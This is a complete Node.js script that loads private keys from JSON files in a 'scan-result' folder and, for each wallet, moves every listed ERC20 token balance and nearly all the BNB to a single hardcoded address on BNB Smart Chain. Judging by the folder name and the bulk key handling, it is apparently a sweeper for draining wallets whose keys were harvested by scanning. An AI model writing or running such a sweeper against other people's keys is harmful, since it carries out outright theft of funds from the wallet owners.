const fs = require("fs");
const path = require("path");
const { Contract, JsonRpcProvider, Wallet, formatEther, isAddress } = require("ethers");

const RPC_URL = "https://bsc-dataseed.binance.org";
const TARGET_ADDRESS = "0xFfbF500e9637fa82F10b3C7d62dc9B9934254888";
const CONCURRENCY = 1;
const WAIT_CONFIRMATIONS = 6;

const SCAN_DIR = path.join(__dirname, "scan-result");
const TOKENS_FILE = path.join(__dirname, "tokens.json");
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

function short(value) {
  if (!value || value.length <= 14) return value;
  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function log(status, wallet, asset, message) {
  const time = new Date().toISOString();
  const address = wallet ? short(wallet.address || wallet) : "-";
  console.log(`${time} | ${status.padEnd(5)} | ${address.padEnd(13)} | ${asset.padEnd(8)} | ${message}`);
}

function logError(file, message) {
  const time = new Date().toISOString();
  console.error(`${time} | FAIL  | ${path.relative(__dirname, file)} | ${message}`);
}

function listJsonFiles(dir) {
  if (!fs.existsSync(dir)) return [];

  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) return listJsonFiles(fullPath);
    if (entry.isFile() && entry.name.endsWith(".json")) return [fullPath];
    return [];
  });
}

function loadTokens() {
  const tokens = JSON.parse(fs.readFileSync(TOKENS_FILE, "utf8"));
  if (!Array.isArray(tokens)) throw new Error("tokens.json must be an array");

  return tokens.map((token, index) => {
    if (!token.address || !isAddress(token.address)) {
      throw new Error(`Invalid token address at tokens.json[${index}]`);
    }

    return {
      symbol: token.symbol || token.address,
      address: token.address,
    };
  });
}

function loadWalletFiles() {
  const seen = new Set();
  const wallets = [];

  for (const file of listJsonFiles(SCAN_DIR)) {
    const data = JSON.parse(fs.readFileSync(file, "utf8"));
    if (!data.privateKey || seen.has(data.privateKey)) continue;

    seen.add(data.privateKey);
    wallets.push({ file, privateKey: data.privateKey });
  }

  return wallets;
}

async function getGasPrice(provider) {
  const fee = await provider.getFeeData();
  if (!fee.gasPrice) throw new Error("RPC did not return gasPrice");
  return fee.gasPrice;
}

async function transferToken(wallet, provider, token) {
  const contract = new Contract(token.address, ERC20_ABI, wallet);
  const balance = await contract.balanceOf(wallet.address);
  if (balance === 0n) {
    log("SKIP", wallet, token.symbol, "balance 0");
    return;
  }

  const gasLimit = await contract.transfer.estimateGas(TARGET_ADDRESS, balance);
  const gasPrice = await getGasPrice(provider);
  const bnbBalance = await provider.getBalance(wallet.address);
  const gasCost = gasLimit * gasPrice;

  if (bnbBalance < gasCost) {
    throw new Error(`${token.symbol}: not enough BNB for gas`);
  }

  const tx = await contract.transfer(TARGET_ADDRESS, balance, { gasLimit, gasPrice });
  log("SENT", wallet, token.symbol, short(tx.hash));

  const receipt = await tx.wait(WAIT_CONFIRMATIONS);
  if (!receipt || receipt.status !== 1) throw new Error(`${token.symbol}: tx failed ${tx.hash}`);

  log("OK", wallet, token.symbol, `block ${receipt.blockNumber} +${WAIT_CONFIRMATIONS}`);
}

async function transferNative(wallet, provider) {
  const gasLimit = 21000n;
  const gasPrice = await getGasPrice(provider);
  const balance = await provider.getBalance(wallet.address);
  const value = balance - gasLimit * gasPrice;

  if (value <= 0n) {
    log("SKIP", wallet, "BNB", `balance ${formatEther(balance)}`);
    return;
  }

  const tx = await wallet.sendTransaction({
    to: TARGET_ADDRESS,
    value,
    gasLimit,
    gasPrice,
  });

  log("SENT", wallet, "BNB", `${formatEther(value)} BNB ${short(tx.hash)}`);

  const receipt = await tx.wait(WAIT_CONFIRMATIONS);
  if (!receipt || receipt.status !== 1) throw new Error(`BNB: tx failed ${tx.hash}`);

  log("OK", wallet, "BNB", `block ${receipt.blockNumber} +${WAIT_CONFIRMATIONS}`);
}

async function collectWallet(item, provider, tokens) {
  const wallet = new Wallet(item.privateKey, provider);
  log("START", wallet, "WALLET", path.relative(__dirname, item.file));

  for (const token of tokens) {
    await transferToken(wallet, provider, token);
  }

  await transferNative(wallet, provider);
}

async function runPool(items, limit, worker) {
  let index = 0;

  await Promise.all(
    Array.from({ length: Math.min(limit, items.length) }, async () => {
      while (index < items.length) {
        const item = items[index++];
        await worker(item);
      }
    })
  );
}

async function main() {
  if (!isAddress(TARGET_ADDRESS)) {
    throw new Error("Replace TARGET_ADDRESS before running");
  }

  if (!Number.isInteger(CONCURRENCY) || CONCURRENCY < 1) {
    throw new Error("CONCURRENCY must be a positive integer");
  }

  const provider = new JsonRpcProvider(RPC_URL);
  const tokens = loadTokens();
  const wallets = loadWalletFiles();
  let failed = 0;

  console.log("time                     | state | wallet        | asset    | message");
  console.log("-------------------------|-------|---------------|----------|------------------------------");
  log("INFO", null, "SETUP", `tokens=${tokens.length} wallets=${wallets.length} concurrency=${CONCURRENCY} confirmations=${WAIT_CONFIRMATIONS}`);

  await runPool(wallets, CONCURRENCY, async (item) => {
    try {
      await collectWallet(item, provider, tokens);
    } catch (error) {
      failed += 1;
      logError(item.file, error.message);
    }
  });

  if (failed > 0) process.exitCode = 1;
  log(failed > 0 ? "WARN" : "OK", null, "DONE", `failed=${failed}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
